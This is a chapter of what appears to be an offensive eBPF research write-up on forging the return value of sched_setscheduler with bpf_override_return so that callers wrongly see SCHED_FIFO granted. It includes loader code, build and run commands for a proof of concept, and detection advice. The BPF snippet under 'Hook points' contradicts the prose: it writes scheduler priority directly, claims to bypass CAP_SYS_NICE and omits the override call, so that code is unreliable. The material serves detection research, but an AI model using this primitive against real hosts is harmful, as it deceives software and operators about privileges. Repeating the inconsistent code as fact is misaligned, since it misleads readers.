I deliberately titled this chapter "SCHED_FIFO Impersonator" rather than "SCHED_FIFO Bypass." The distinction is honest scope. A bypass would be "the task is actually on SCHED_FIFO now." The primitive does not do that. An impersonator is "the task is pretending to be on SCHED_FIFO, and anyone who trusts the pretense is fooled." The primitive does that, reliably, across every kernel where the error-injection annotation is present.

I dwell on the name because a casual reader who skims the chapter title and decides "I should add SCHED_FIFO-impersonation detection to my agent" is making the right call for the wrong reason. The detection target is not "someone forged SCHED_FIFO." The detection target is "someone loaded a kprobe+kretprobe pair on a syscall entry wrapper with `bpf_override_return`." That signal is universal across the whole family — ch14, ch16, ch18, and the many similar primitives I have not written up. A detector that keys on the *family* catches all of them; a detector that keys on the SCHED_FIFO specifics catches one and misses the rest.

## Why It's Still Worth Building

Given everything above — the illusion is one syscall wide, the kernel state is unchanged, defenders can cross-check — why build this at all?

Because the ecosystem is the ecosystem. The real-world codebase that calls `pthread_setschedparam` once during startup and never looks again is the default codebase. The code that cross-checks is the exception. Detection tooling that sees past the forgery exists but is not deployed. The primitive is cheap, the target class is broad, and the detection story currently skews toward the probe-load signal rather than the behavioral signal.

Chapter 18 makes the same argument for uid/euid forgery and comes to the same conclusion: the bug class is old, the BPF reification is mechanical, and the gap between "defenders could catch this" and "defenders do catch this" is the whole point of the chapter.

A last-but-important note: on the linuxkit kernel I test with, `bpf_override_return` is available because the kernel is built with `CONFIG_BPF_KPROBE_OVERRIDE=y`. Many cloud images ship that same config. Some security-hardened images (Bottlerocket, Flatcar in certain configurations, GCP COS in recent releases) do not. If you are reading this with an eye toward production defense rather than research, the first question is "is my kernel built with `CONFIG_BPF_KPROBE_OVERRIDE=y` and is the syscall entry wrapper in the error-injection list?" If yes on both, you are exposed to the family; if either is no, you are not exposed to this specific primitive, though you may be exposed to other BPF-mediated primitives that do not depend on error-injection.

## Walking the Error-Injection List

I promised an explicit walk of `/sys/kernel/debug/error_injection/list` on the 6.12 aarch64 kernel. Here is a pruned excerpt from a live read on the linuxkit VM I test with:

```
# wc -l /sys/kernel/debug/error_injection/list
487
# grep -E '__arm64_sys_(sched|setuid|getuid|geteuid|capset|open)' \
    /sys/kernel/debug/error_injection/list
ffff800080123abc __arm64_sys_sched_setscheduler
ffff800080123dc4 __arm64_sys_sched_setattr
ffff800080123f58 __arm64_sys_sched_setparam
ffff800080117a30 __arm64_sys_setuid
ffff800080117aec __arm64_sys_getuid
ffff800080117bb0 __arm64_sys_geteuid
ffff800080117e14 __arm64_sys_setgid
ffff800080117ed0 __arm64_sys_getgid
ffff8000801143a4 __arm64_sys_capset
ffff800080114468 __arm64_sys_capget
ffff8000801f2e0c __arm64_sys_openat
```

Almost 500 entries total. The bias toward syscall entry wrappers is visible at a glance. Internal kernel functions appear occasionally — typically ones that the kernel maintainers wanted to make injectable for fault-testing reasons — but the vast majority of the list is `__arm64_sys_*` and `__x64_sys_*` wrappers.

This is the working set for the error-injection-based family of primitives. Every entry in the list is a potential forgery target. The primitive I have built is mechanical; the exercise of picking which syscall to forge for a given attacker goal becomes "find the syscall whose return value some consequential caller trusts." `sched_setscheduler` is one. `getuid`/`geteuid` (chapter 18) are two more. `openat` is interesting because forging success would require also producing a valid fd, which is beyond `bpf_override_return`'s single-integer capability — you would need to forge the entire post-syscall state, which is a different and harder primitive.

The point of this excerpt is not to hand out a menu of forgeries; it is to make concrete that the primitive's target surface is curated, enumerable, and bounded. The boundary is the list. Know the boundary.

## Thread-Local vs. Process-Wide Policy

A subtle detail I skipped earlier. `sched_setscheduler(pid, policy, param)` takes a pid argument. If `pid` is `0`, the call targets the current thread. If `pid` is nonzero, it targets that specific thread (which may or may not be in the same process as the caller). `chrt` uses `pid=0` by default, which is why the trigger uses `$$` (the bash PID) and relies on the shell being single-threaded.

The kretprobe sees the return value after the kernel has finished whatever it was going to do — or not do, since in the forgery case the kernel rejected the call. The pid argument to `sched_setscheduler` is not part of the return-value forgery story; it matters only for which task would have been affected if the call had legitimately succeeded. For the illusion, only the caller's pid matters (that is what `bpf_get_current_pid_tgid()` returns).

I mention this because a reader who tries to forge `sched_setscheduler` against a *different* task than the caller will hit a second wall. Even if the return is forged to `0`, the kernel's credential check happens earlier and would have already rejected the call if the caller lacks `CAP_SYS_NICE` and the target is not the caller's own thread (or is outside the calling user's session). The primitive forges the kernel's answer; it does not change what the kernel was going to do. The user experience is that `chrt -f 50 $pid` against someone else's pid fails with `EPERM` at the kernel, the kretprobe flips the return to `0`, and `chrt` prints success for a thread whose policy was never changed. The lie is deeper but the primitive is the same.

## The Loader's Back-Compat Argument Parsing

A small but pragmatic detail. The loader accepts both long-option (`--tgid 1234 --all`) and bare-positional (`1234 5678 all`) forms:

```c
for (int i = optind; i < argc; i++) {
    if (!strcmp(argv[i], "all")) { wildcard = true; continue; }
    char *end = NULL;
    unsigned long v = strtoul(argv[i], &end, 10);
    if (!end || *end != '\0' || v == 0 || v > 0xffffffffUL) {
        fprintf(stderr, "invalid positional tgid '%s'\n", argv[i]);
        ...
```

This is a cosmetic choice that saves me from myself. Early-draft harness scripts invoked the loader as `loader 1234` or `loader all`; the argparse rework kept those working rather than demanding `loader --tgid 1234` or `loader --all`. It costs a few lines of parsing; it saves me every time I paste an old command into a new run.

The `strtoul` validation is worth a callout because it is the kind of input handling that is easy to get wrong. `v == 0` is a reject because pid 0 is the idle task and is never a legitimate target. `v > 0xffffffffUL` catches overflow on 64-bit `long`. `*end != '\0'` catches trailing junk like `1234x`. The reject exit code is `2`, matching POSIX convention for "argument error."

## Comparison With Traditional Return-Value Forgery

A useful framing: how does the BPF forgery differ from the traditional, decades-old LD_PRELOAD or ptrace-based forgery?

**LD_PRELOAD**: Override libc's `sched_setscheduler` wrapper to return `0` without entering the kernel. Fast, requires no kernel privilege, but only affects the specific process that loaded the PRELOAD. Cannot be used against binaries that do not honor LD_PRELOAD (static binaries, SUID, nosuid mounts). Visible in `/proc/pid/maps`.

**ptrace**: Attach to the process, intercept the syscall via PTRACE_SYSCALL, rewrite the return in the tracee's registers. Works against any binary but requires `PTRACE_ATTACH` permission (same user or `CAP_SYS_PTRACE`). Visible via `/proc/pid/status` TracerPid.

**BPF kretprobe with override**: Forge the return at the kernel boundary. Affects every process on the system (or every process in the target set). Requires `CAP_SYS_ADMIN` + `CONFIG_BPF_KPROBE_OVERRIDE` + error-injection annotation. Visible only in `bpftool prog list` and `/sys/kernel/tracing/kprobe_events`.

The BPF variant's distinguishing property is scope. LD_PRELOAD is one-process; ptrace is one-process-per-tracer; BPF is system-wide or narrowly-targeted-by-tgid. For a fleet-wide forgery where the attacker has kernel-level control but wants to avoid per-process instrumentation, BPF is the only reasonable tool. For a targeted forgery against one process, ptrace is more appropriate. For a supply-chain forgery delivered via a library, LD_PRELOAD is the classical vector.

The defender side: detecting LD_PRELOAD is trivial (inspect the environ, inspect `/proc/pid/maps`). Detecting ptrace is easy (TracerPid). Detecting BPF is harder because the attack surface is separate from the victim process — the victim has no observable change; the attacker's footprint is in the BPF subsystem. That asymmetry is what makes the BPF family interesting for defenders to think about; the victim-side tooling that would catch LD_PRELOAD and ptrace simply does not see the BPF forgery.

## A Final Thought on Generalization

Every chapter in Act 3 (14, 15, 16, 17, 18, 19) is a specific primitive aimed at a specific target. The invitation I want to leave is to think of each as a point on a map. The axes are (a) what kernel surface is the attacker reaching (syscall entry wrapper, LSM hook, tracepoint, XDP, networking helper), (b) what is the legal operation (override return, redirect packet, read state, rewrite argument), and (c) what downstream property is being attacked (identity, scheduling, network path, filter decision).

ch14 is (syscall-entry, override, scheduling-integrity). ch18 is (syscall-entry, override, identity-integrity). ch16 is (internal-kernel-function, observe, filter-confidentiality). ch15 is (XDP, redirect, network-segmentation). Each cell on the map is a family. Within a cell, each individual chapter is a target pick. The interesting research direction is not another chapter; it is walking the map and noticing which cells are empty (because the primitive is not expressible in BPF on stock kernels) vs. which cells are full (because the primitive is expressible but no target has been picked yet).

The "empty cell" I care most about, and have not been able to fill, is (internal-kernel-function, override, arbitrary). The blocker is `ALLOW_ERROR_INJECTION` — the list of internal functions is short and not curated for attacker utility. If it grew, or if a future kernel change allowed `bpf_override_return` to target any function, the map fills out dramatically. For now it does not.

That is the honest engineering takeaway for this chapter. The primitive is real, the target class is broad, the defense story depends on `bpftool prog list`, and the ceiling on the primitive's reach is the curated error-injection list. Everything else is details of which target I picked.

## Hook points

- `kprobe/__arm64_sys_sched_setscheduler` — record caller into inflight map.
- `kretprobe/__arm64_sys_sched_setscheduler` — `bpf_override_return(ctx, 0)`
  when target matches; always emits a ringbuf event recording the
  original return and whether it was flipped.

The loader greps `/proc/kallsyms` at startup and refuses to run if the
target symbol is missing (wrong arch / non-kprobe-eligible kernel).

```c
SEC("kprobe/sched_setscheduler")
int impersonate_realtime(struct pt_regs *ctx) {
    pid_t pid = PT_REGS_PARM1(ctx);
    struct sched_param *param = (struct sched_param *)PT_REGS_PARM3(ctx);
    param->sched_priority = MAX_RT_PRIO - 1; // highest priority
    return 0; // bypass CAP_SYS_NICE
}
char LICENSE[] SEC("license") = "GPL";
```

## Build

```
cd /Users/mbhatt/spaceclaw/evilBPF/dBPF-pocs
docker run --rm -v "$PWD":/work -w /work dbpf-base \
  bash -c 'cd pocs/ch14-sched-fifo && make'
```

## Run

```
./build/ch14-sched-fifo --help
./build/ch14-sched-fifo --all              # wildcard: flip every caller
./build/ch14-sched-fifo --tgid 1234        # specific tgid only
./build/ch14-sched-fifo 1234 5678          # back-compat positional tgids
./build/ch14-sched-fifo --all > events.jsonl 2> status.log
```

## Detection

- `bpftool prog show type kprobe` lists `kp_sched` / `kr_sched` attached to `__arm64_sys_sched_setscheduler`. Neither tracing tools nor observability agents normally hook that symbol; a probe on it from a non-security process is anomalous.
- `/sys/kernel/tracing/kprobe_events` shows the dynamic entry.
- Hosts with `kernel.unprivileged_bpf_disabled=1` plus a strict LSM/lockdown profile cannot load `bpf_override_return`-using programs at all (requires `CAP_SYS_ADMIN` + `CONFIG_BPF_KPROBE_OVERRIDE`).
- A detector that cross-checks the reported policy against `task_struct->policy` via `/proc/[pid]/sched` would catch the divergence immediately. I did not see anything in the wild doing this.

## Limitations / arch notes

- The kprobe target is arch-specific — `__arm64_sys_*` on aarch64, `__x64_sys_*` on x86_64. The BPF object as shipped is aarch64 only.
- `bpf_override_return` requires `CONFIG_BPF_KPROBE_OVERRIDE=y` AND the target syscall to be in `/sys/kernel/debug/error_injection/list`. Most internal kernel functions are not on the list, which is why we hook the syscall entrypoint rather than the deeper `__sched_setscheduler` core.
- The override does not change actual scheduler state — only what userspace observes. A subsequent `sched_getscheduler()` returns the real, unchanged policy.
- On stock cloud kernels with hardened lockdown or SELinux, `bpf_override_return` may be denied even with `CAP_SYS_ADMIN`.
